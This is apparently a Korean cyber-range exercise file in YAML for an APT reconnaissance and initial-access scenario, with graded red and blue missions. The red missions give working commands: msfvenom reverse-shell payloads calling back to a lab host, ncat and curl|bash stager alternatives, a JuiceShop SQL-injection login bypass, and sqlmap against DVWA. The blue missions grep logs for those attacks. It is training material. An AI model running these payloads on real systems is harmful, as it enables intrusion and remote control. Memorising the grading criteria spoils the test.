id: "apt-phase1"
title: "APT 1단계: 정찰 + 초기 침투"
description: "국가 배후의 APT 그룹이 우리 조직을 타겟으로 삼았다는 위협 인텔리전스가 입수되었다. 1단계에서 Red Team은 OSINT 정보를 수집하고 스피어피싱 페이로드를 준비하여 초기 침투 거점을 확보해야 한다. Blue Team은 이메일 로그 분석과 엔드포인트 모니터링으로 초기 침투를 조기에 탐지해야 한다."
difficulty: "hard"
time_limit: 3600
battle_type: "1v1"

red_missions:
  - order: 1
    instruction: "대상 조직의 웹 인프라를 OSINT 방식으로 조사하라. 웹 서버의 기술 스택, CMS, 프레임워크 정보를 수집하라."
    hint: "whatweb http://10.20.30.80 http://10.20.30.80:3000 http://10.20.30.80:8080 -v 2>&1 | head -60"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "http://10.20.30.80"
      semantic:
        intent: "MITRE ATT&CK T1592 (Gather Victim Host Information) — whatweb 또는 wappalyzer 류로 10.20.30.80(:3000/:8080) 웹 서비스의 기술 스택·CMS·프레임워크를 식별. APT killchain Recon 단계의 시작점."
        success_criteria:
          - "10.20.30.80 (또는 :3000/:8080) 대상 호출 흔적이 응답에 명확히 보임"
          - "최소 1개 이상의 서버 헤더·CMS 시그니처(Apache/Nginx/Express/PHP/Bootstrap 등) 식별"
          - "수집한 기술 스택 기반의 다음 정찰 단계(취약점 매핑) 언급"
        acceptable_methods:
          - "whatweb -v <URL>"
          - "wappalyzer-cli + curl -I 결합"
          - "httpx -title -tech-detect -web-server (projectdiscovery)"
          - "nmap -sV --script=http-enum,http-headers <host>"
        negative_signs:
          - "10.20.30.80 호출 없이 일반 OSINT 이론만 설명"
          - "기술 스택 이름 한 개도 도출하지 못함"
          - "T1592/T1595 등 ATT&CK 매핑 누락 + 다음 단계 연결 없음"

  - order: 2
    instruction: "대상 네트워크의 전체 서비스 맵을 구성하라. 모든 호스트의 열린 포트와 서비스를 스캔하라."
    hint: "nmap -sV -O -p 1-10000 10.20.30.1 10.20.30.80 10.20.30.100 --max-retries 1 --host-timeout 15s -T4"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect:
        - "Service Info"
        - "open"
        - "tcp"
      semantic:
        intent: "MITRE ATT&CK T1046 (Network Service Discovery) — nmap -sV (서비스 버전) + -O (OS fingerprint) 로 10.20.30.1/.80/.100 의 1-10000 포트 매핑. 1단계 정찰의 핵심 산출물."
        success_criteria:
          - "최소 2개 이상의 호스트(10.20.30.1/.80/.100)에 대해 open 포트 결과 출력"
          - "서비스/버전 식별(예: Apache 2.4, OpenSSH, PostgreSQL 등) 최소 1건"
          - "정찰 결과 → 잠재 침투 벡터 우선순위 도출 (예: 8080 web 우선)"
        acceptable_methods:
          - "nmap -sV -O -p 1-10000 ... -T4"
          - "rustscan -a <ip> -- -sV (대용량 빠른 스캔)"
          - "masscan -p1-10000 <range> --rate=1000 + nmap -sV 후속"
          - "naabu -host <ip> -p - + nmap 결합"
        negative_signs:
          - "단일 포트(예: 80만) 탐색 후 결론"
          - "서비스 버전 없이 포트 번호만 나열"
          - "스캔 흔적이 응답 토큰에 전혀 없고 nmap 개념 설명만"

  - order: 3
    instruction: "리버스 셸 페이로드를 생성하라 (Metasploit msfvenom 사용)."
    hint: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/payload.elf 2>&1 && file /tmp/payload.elf"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect:
        - "ELF"
        - "payload.elf"
      semantic:
        intent: "MITRE ATT&CK T1059.004 (Unix Shell) + T1190 weaponization — msfvenom 으로 linux/x64/shell_reverse_tcp 페이로드를 LHOST=10.20.30.201 LPORT=4444 로 ELF 빌드. 무기화 단계 산출물 검증을 file 명령으로 확인."
        success_criteria:
          - "/tmp/payload.elf 파일이 실제로 생성됨"
          - "file 출력에 'ELF 64-bit' 또는 'executable' 포함 — 정상 바이너리 확인"
          - "msfvenom 옵션에 LHOST/LPORT 파라미터 명시"
        acceptable_methods:
          - "msfvenom -p linux/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f elf -o /tmp/payload.elf"
          - "python3 -c 'socket.socket()...os.dup2()' 스크립트 → pyinstaller --onefile"
          - "ncat --ssl -e /bin/bash <LHOST> <LPORT> (간이 리버스셸)"
          - "go build 로 socket reverse shell 컴파일"
        negative_signs:
          - "페이로드 파일 미생성 — payload.elf 확인 단계 누락"
          - "LHOST/LPORT 자리만 채우고 실제 빌드 명령 없음"
          - "msfvenom 옵션 설명만 하고 file 검증 생략"

  - order: 4
    instruction: "스피어피싱 이메일에 첨부할 악성 매크로 문서를 시뮬레이션하라."
    hint: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4445 -f bash -o /tmp/macro_payload.sh 2>&1 && cat /tmp/macro_payload.sh | head -5"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect:
        - "payload"
        - "macro_payload"
      semantic:
        intent: "MITRE ATT&CK T1566.001 (Spearphishing Attachment) 시뮬레이션 — msfvenom -f bash 로 셸 명령 형태 페이로드를 /tmp/macro_payload.sh 로 추출. 실제 매크로 첨부의 셸 단계 동등 시뮬레이션."
        success_criteria:
          - "/tmp/macro_payload.sh 파일 생성 + cat 으로 내용 일부 노출"
          - "페이로드에 LHOST=10.20.30.201 LPORT=4445 또는 socket 연결 코드 포함"
          - "실 매크로 대신 bash 형태 사용 이유 명시 (Linux 실습 환경)"
        acceptable_methods:
          - "msfvenom -p linux/x64/shell_reverse_tcp -f bash -o /tmp/macro_payload.sh"
          - "Powershell empire-style stager 의 Linux 변형 (curl|bash 1-liner)"
          - "Python -c '...exec(base64.b64decode(...))...' Stager"
          - "Office macro VBA 의 PowerShell launcher 텍스트 작성 (이론)"
        negative_signs:
          - "macro_payload.sh 미생성"
          - "LPORT/LHOST 변수 미치환 (placeholder 그대로)"
          - "스피어피싱 시나리오 맥락(첨부→실행→reverse_tcp) 설명 부재"

  - order: 5
    instruction: "nikto로 웹 서버의 취약점을 상세 스캔하여 초기 침투 벡터를 식별하라."
    hint: "nikto -h http://10.20.30.80:8080 -maxtime 90s -C all 2>&1 | head -50"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect:
        - "Server:"
        - "nikto"
        - "Target IP"
      semantic:
        intent: "MITRE ATT&CK T1595.002 (Vulnerability Scanning) — nikto -C all 로 8080 DVWA의 흔한 취약점(헤더 누락, 노출된 디렉토리, OS 취약 버전 등) 자동 스캔. -maxtime 90s 로 시간 제한."
        success_criteria:
          - "Target IP/Hostname/Port 정보 출력 (nikto 표준 헤더)"
          - "최소 1개 이상 OSVDB 또는 finding 식별 (X-Frame-Options 누락, /admin 노출 등)"
          - "결과 기반의 다음 익스플로잇 후보(SQLi, XSS, RCE) 매핑"
        acceptable_methods:
          - "nikto -h http://<host>:8080 -maxtime 90s -C all"
          - "nuclei -t exposures/ -u <target>"
          - "wapiti -u <target> --scope folder"
          - "OWASP ZAP CLI baseline scan"
        negative_signs:
          - "nikto 명령 미실행 + 일반 nikto 사용법만 나열"
          - "Target IP 출력 부재 — 실제 호출 안됨"
          - "취약점 후보 0건"

  - order: 6
    instruction: "JuiceShop의 알려진 취약점을 통해 초기 접근 권한을 획득하라."
    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect:
        - "token"
        - "authentication"
        - "JuiceShop"
      semantic:
        intent: "MITRE ATT&CK T1190 (Exploit Public-Facing Application) — JuiceShop /rest/user/login 에 SQL injection 페이로드(' or 1=1--) 로 인증 우회 시도. 성공 시 JWT token 발급 응답."
        success_criteria:
          - "POST /rest/user/login 호출 + JSON body 에 인젝션 페이로드"
          - "응답에 authentication / token 필드 (성공) 또는 error 메시지 (실패) 검증"
          - "JuiceShop 환경 인지 + 다음 권한 상승 경로 언급"
        acceptable_methods:
          - "curl -X POST .../rest/user/login -d '{\"email\":\"... or 1=1--\",...}'"
          - "sqlmap -u .../rest/user/login --data='...' --batch"
          - "OWASP ZAP / Burp Suite 의 SQLi 페이로드 자동화"
          - "JuiceShop 공식 challenge 풀이 가이드 활용 (admin login)"
        negative_signs:
          - "/login 호출 없이 SQLi 이론 설명만"
          - "응답 분석 누락 — token / error 어느 쪽도 확인 안함"
          - "JuiceShop 외 다른 앱 대상으로 시도"

  - order: 7
    instruction: "sqlmap으로 DVWA를 통한 데이터베이스 접근 경로를 확보하라."
    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --current-db 2>&1 | tail -20"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect:
        - "current database"
        - "sqlmap"
        - "back-end DBMS"
      semantic:
        intent: "MITRE ATT&CK T1190 + T1213 — sqlmap 자동화로 DVWA SQLi 엔드포인트(/vulnerabilities/sqli) 의 DBMS 식별 + 현재 DB 추출. --cookie 로 로그인 세션 + security=low 설정."
        success_criteria:
          - "sqlmap 실행 + back-end DBMS (MySQL/PostgreSQL 등) 식별"
          - "current database 출력 (예: 'dvwa')"
          - "다음 단계 — tables / columns 추출 계획 명시"
        acceptable_methods:
          - "sqlmap -u <url> --cookie='...' --batch --current-db"
          - "sqlmap --batch --dbs --tables (전체 enum)"
          - "수동 UNION SELECT payload (curl 기반)"
          - "Burp Suite + sqlmap-extension"
        negative_signs:
          - "sqlmap 호출 없이 SQLi 이론 설명"
          - "Cookie 누락 — 인증 실패로 빈 응답"
          - "current-db 출력 미확인"

blue_missions:
  - order: 1
    instruction: "suricata 로그에서 정찰 단계의 스캔 활동을 탐지하라."
    hint: "grep -iE 'scan\\|recon\\|enum' /var/log/suricata/fast.log | tail -20"
    points: 10
    target_vm: secu
    verify:
      type: "output_contains"
      expect:
        - "10.20.30"
        - "scan"
        - "alert"
      semantic:
        intent: "MITRE D3FEND D3-NTA (Network Traffic Analysis) — suricata fast.log 에서 nmap/recon/scan 시그니처 트리거 검색. Red Team의 #2 nmap 스캔에 대응되는 탐지."
        success_criteria:
          - "/var/log/suricata/fast.log grep 결과에 scan/portscan 관련 알림 1건 이상"
          - "공격자 IP (10.20.30.201) 흔적 노출"
          - "탐지된 시그니처 → ET SCAN / Suricata SID 언급"
        acceptable_methods:
          - "grep -iE 'scan|recon|portscan' /var/log/suricata/fast.log"
          - "jq '.alert.signature' /var/log/suricata/eve.json | grep -i scan"
          - "Wazuh 룰 (decoder=suricata) 검색 → /var/ossec/logs/alerts"
          - "Splunk/ELK 인덱스에서 sourcetype=suricata 쿼리"
        negative_signs:
          - "fast.log 미존재/접근 실패 — 다른 파일에서 grep"
          - "스캔 흔적 0건 + 원인(룰 미적용 등) 분석 부재"
          - "공격자 IP 식별 없이 탐지 종결"

  - order: 2
    instruction: "suricata의 eve.json에서 공격자 IP의 활동 타임라인을 분석하라."
    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp',''),json.loads(l).get('event_type','')) for l in sys.stdin]\" 2>/dev/null | tail -20"
    points: 15
    target_vm: secu
    verify:
      type: "output_contains"
      expect:
        - "10.20.30.201"
        - "timestamp"
        - "event_type"
      semantic:
        intent: "Forensics — eve.json (suricata 구조화 로그) 에서 공격자 IP 10.20.30.201 활동의 시간순 분석. event_type(alert/flow/dns/http) 별 행위 타임라인 재구성."
        success_criteria:
          - "10.20.30.201 관련 이벤트 타임라인 (timestamp + event_type) 20건 이상"
          - "event_type 분포 식별 (alert / flow / http 비율)"
          - "공격 단계(recon → exploit) 매핑 제안"
        acceptable_methods:
          - "grep + python json 파싱 (hint 그대로)"
          - "jq -r 'select(.src_ip==\"10.20.30.201\") | [.timestamp,.event_type] | @tsv' eve.json"
          - "ELK Discover (filter src_ip + sort timestamp)"
          - "Zeek conn.log 보조 분석"
        negative_signs:
          - "eve.json 접근 실패 — 분석 데이터 0건"
          - "공격자 IP 필터링 없이 전체 로그 dump"
          - "타임라인 재구성 없이 단순 grep 결과만"

  - order: 3
    instruction: "Wazuh에서 비정상 인증 시도 알림을 확인하라."
    hint: "grep -iE 'authentication\\|login\\|credential' /var/ossec/logs/alerts/alerts.json | tail -20"
    points: 15
    target_vm: siem
    verify:
      type: "output_contains"
      expect:
        - "alert"
        - "authentication"
        - "rule"
      semantic:
        intent: "MITRE D3FEND D3-UAA (User Account Activity Detection) — Wazuh alerts.json 에서 authentication failure / brute force 룰 트리거 검색. JuiceShop login 폭주(SQLi) 탐지."
        success_criteria:
          - "alerts.json 에 authentication 관련 알림 1건 이상"
          - "Wazuh rule.id 또는 description 노출"
          - "출처 IP/ 사용자 식별 (예: agent_ip = 10.20.30.80)"
        acceptable_methods:
          - "grep -iE 'authentication|login' /var/ossec/logs/alerts/alerts.json"
          - "jq 'select(.rule.groups | contains([\"authentication\"]))' alerts.json"
          - "Wazuh dashboard → Security events → Authentication"
          - "OSSEC agent_control -i <agent>"
        negative_signs:
          - "alerts.json 미존재 — Wazuh 미운영 가능성 보고만"
          - "결과 0건 + 룰셋 점검 미수행"
          - "rule.id 누락"

  - order: 4
    instruction: "Apache 접근 로그에서 SQLi 및 취약점 스캔 흔적을 분석하라."
    hint: "grep -iE 'sqlmap\\|nikto\\|union\\|select\\|exec' /var/log/apache2/access.log | tail -20"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect:
        - "sqlmap"
        - "union"
        - "select"
      semantic:
        intent: "MITRE D3FEND D3-WAF (Web Application Firewall analytics) — Apache access.log 에서 sqlmap/nikto User-Agent 또는 UNION SELECT 페이로드 grep. Red #5 nikto + #7 sqlmap 활동에 대응되는 탐지."
        success_criteria:
          - "access.log 에서 sqlmap 또는 nikto User-Agent 발견"
          - "UNION SELECT / EXEC 등 SQLi 페이로드 흔적"
          - "공격자 IP + URL 패턴 식별"
        acceptable_methods:
          - "grep -iE 'sqlmap|nikto|union|select' /var/log/apache2/access.log"
          - "awk '$9>=400 && $9<500' access.log (4xx 폭주)"
          - "ModSecurity audit log 분석 (/var/log/modsec_audit.log)"
          - "GoAccess 또는 awstats 시각화"
        negative_signs:
          - "access.log 미존재 — 경로 오류"
          - "공격 패턴 0건 + 공격자 무활동 결론"
          - "User-Agent 분석 누락"

  - order: 5
    instruction: "nftables에 공격자 IP를 긴급 차단하고 로깅을 활성화하라."
    hint: "nft add rule inet filter input ip saddr 10.20.30.201 log prefix '\"BLOCKED-APT: \"' drop"
    points: 20
    target_vm: secu
    verify:
      type: "output_contains"
      expect:
        - "ip saddr 10.20.30.201"
        - "drop"
        - "BLOCKED-APT"
      semantic:
        intent: "MITRE D3FEND D3-NTF (Network Traffic Filtering) — nftables inet filter input 체인에 공격자 IP 차단 룰 + log prefix 'BLOCKED-APT' 동시 적용. 실시간 격리 + audit trail 확보."
        success_criteria:
          - "nft 룰 추가 명령 실행 — 'ip saddr 10.20.30.201' + 'drop'"
          - "log prefix 'BLOCKED-APT' 포함 (포렌식 trail)"
          - "nft list ruleset 으로 룰 적용 확인"
        acceptable_methods:
          - "nft add rule inet filter input ip saddr <ip> log prefix '...' drop"
          - "iptables -I INPUT -s <ip> -j LOG --log-prefix 'BLOCKED-APT:' && iptables -I INPUT -s <ip> -j DROP"
          - "firewalld --permanent --add-rich-rule='rule source address=<ip> drop'"
          - "Cisco ACL deny ip host <ip> any (네트워크 장비)"
        negative_signs:
          - "nft 룰 미실행 — 명령만 출력"
          - "log prefix 없는 단순 drop"
          - "차단 후 nft list 검증 누락"

  - order: 6
